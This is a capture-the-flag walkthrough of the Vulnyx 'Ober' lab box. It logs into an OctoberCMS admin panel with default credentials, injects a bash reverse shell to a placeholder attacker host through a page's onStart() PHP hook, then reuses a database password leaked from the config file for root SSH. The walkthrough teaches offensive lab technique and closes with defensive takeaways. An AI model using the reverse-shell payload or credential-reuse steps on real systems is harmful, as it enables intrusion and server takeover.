# Vulnyx: Ober

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `c0w` |
| **Tools used** | `nmap` · `ffuf` · `nc` · `hydra` |
| **Tags** | `#DefaultCreds` `#RCE` `#CredentialLeak` `#CredentialReuse` |
| **URL** | https://vulnyx.com/machines/ |

An OctoberCMS backend is found running with its default `admin:admin` credentials. Its page editor lets an authenticated admin attach PHP code directly to a page's lifecycle events — abused here to run arbitrary commands and get a reverse shell. From there, the CMS's own database config file leaks a `root` password that turns out to be reused for SSH, giving direct root access with no separate privilege escalation step.

## Enumeration
### Port Enumeration
A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn ober.nyx

PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 64
80/tcp   open  http        syn-ack ttl 64
8080/tcp open  http-proxy  syn-ack ttl 64
MAC Address: 08:00:27:B2:49:51 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **8080**. A version and script scan on all three fills in the details:

```bash
$ sudo nmap -p 22,80,8080 -sCV ober.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Homepage &#124; My new website
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:B2:49:51 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

Two web servers are running:

```
http://ober.nyx/
```

<img src="../Images/ober/Pasted image 20260804154623.png"/>

```
http://ober.nyx:8080/
```

<img src="../Images/ober/Pasted image 20260804154644.png"/>

Both get fuzzed for content:

```bash
$ ffuf -u http://ober.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.php             [Status: 200, Size: 9843, Words: 3125, Lines: 224, Duration: 356ms]
.html                 [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 2200ms]
.php                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 4207ms]
themes                [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 5ms]
0                      [Status: 200, Size: 9843, Words: 3125, Lines: 224, Duration: 1259ms]
modules                [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 5ms]
storage                [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 94ms]
plugins                [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 55ms]
backend                [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 2957ms]
vendor                 [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 54ms]
config                 [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 267ms]
```

The `0` hit is a false positive rather than a real path — its size is identical to `index.php`, which is typical of a CMS catch-all route serving the homepage for any URL it doesn't otherwise recognize. The genuinely interesting result is `backend`, a 302 redirect that points at the CMS's admin login.

```bash
$ ffuf -u http://ober.nyx:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 186, Words: 28, Lines: 8, Duration: 1425ms]
.html                  [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1687ms]
.php                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3410ms]
.html                  [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 161ms]
.php                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 161ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 37ms]
```

Port 8080 turns out to be a dead end beyond the default Apache page and a run of 403s — nmap's earlier `http-open-proxy` flag is a well-known false positive against a bare default install with no real site behind it, so 8080 goes no further.

> **Directory found:** `http://ober.nyx/backend`

## Initial Access

### OctoberCMS Backend Login

```
http://ober.nyx/backend/auth/signin
```

<img src="../Images/ober/Pasted image 20260804154808.png"/>

OctoberCMS doesn't force an admin to change the credentials set during installation, so the stock `admin:admin` pair goes straight at the login form — and it works:

> **Default credentials:** `admin:admin`

<img src="../Images/ober/Pasted image 20260804154111.png"/>

### RCE via Page Code Injection

OctoberCMS's backend lets an authenticated admin attach PHP directly to a CMS page's lifecycle — code placed in an `onStart()` function runs server-side the moment the page loads, which is a legitimate feature turned into command execution. Creating a new page (**CMS → Pages → + Add**) with its URL set to `/reverse_shell`, then enabling the editor's advanced/split view — toggled from the small gear icon above the code panel — exposes a PHP code block separate from the page's Twig markup:

```php
function onStart(){
  exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'");
}
```

Once saved, requesting the page triggers it:

```bash
$ curl -sX GET 'http://ober.nyx/reverse_shell'
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [ober.nyx] 47696
bash: cannot set terminal process group (476): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ober:/var/www/html/octobercms$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The doubled `id` line and the `no job control in this shell` warning are the signature of a raw, PTY-less shell — the terminal is echoing the typed command back before bash's own output arrives.

### Shell as www-data

That's uncomfortable to work in (no tab completion, odd behavior from anything that reads a password interactively, `Ctrl+C` liable to kill the whole session), so the next step upgrades it to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

Spawning a `pty` from Python hands the shell a real pseudo-terminal; backgrounding it with `Ctrl+Z` to put the local terminal into raw mode (`stty raw -echo`) before foregrounding it again (`fg`) restores proper line editing and signal handling, and `export TERM=xterm` brings back things like clear-screen and arrow-key support.

## Privilege Escalation

### Loot: Database Credentials in Config

OctoberCMS is built on Laravel, whose convention is to keep database connection settings in `config/database.php` — a plain PHP array with `host`, `database`, `username`, and `password` keys. That makes it a natural first stop once there's a shell on a CMS box:

```bash
www-data@ober:/var/www/html/octobercms$ ls -l /var/www/html/octobercms
www-data@ober:/var/www/html/octobercms$ ls -l /var/www/html/octobercms/config
www-data@ober:/var/www/html/octobercms$ cat /var/www/html/octobercms/config/database.php
```

<img src="../Images/ober/Pasted image 20260804154925.png"/>

The file hands over a `root` credential pair:

> **Credentials:** `root:r00tP@ssW0rd`

### Root Access via a Reused Database Credential

As with a few other boxes in this set, root here comes from a credential found somewhere it shouldn't have been reused, not from a local exploit:

```bash
$ hydra -l 'root' -p 'r00tP@ssW0rd' ssh://ober.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://ober.nyx:22/
[22][ssh] host: ober.nyx   login: root   password: r00tP@ssW0rd
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh root@ober.nyx
root@ober.nyx's password:
root@ober:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ober:~# ls -l /home
total 4
drwx------    4 c0w      c0w           4096 May  4  2025 c0w
root@ober:~# ls -l /home/c0w
total 4
-r--------    1 c0w      c0w             33 May  4  2025 user.txt
root@ober:~# cat /home/c0w/user.txt
75970994f3256f77ad3ffca0ee61e3cc
root@ober:~#
root@ober:~# ls -l /root
total 4
-r--------    1 root     root            33 May  4  2025 root.txt
root@ober:~# cat /root/root.txt
5dfcd9cc7d148d769538039077e5d021
root@ober:~#
```

> **User flag:** `75970994f3256f77ad3ffca0ee61e3cc`
> **Root flag:** `5dfcd9cc7d148d769538039077e5d021`

## Takeaways

- A CMS backend's own content/page editor is a common overlooked RCE surface — any feature that lets an authenticated admin attach server-side code to a page is code execution by design, not a bug in the traditional sense.
- Default credentials on a CMS admin panel remain worth trying first, regardless of how the rest of the box is configured.
- Reusing a database password as a system account's password turns a config file leak into full server compromise — the two credentials should never overlap.
- A raw netcat shell without a PTY (no job control, doubled command echoes) is worth upgrading immediately with `pty.spawn` — it turns an awkward, fragile shell into one that behaves like a normal terminal.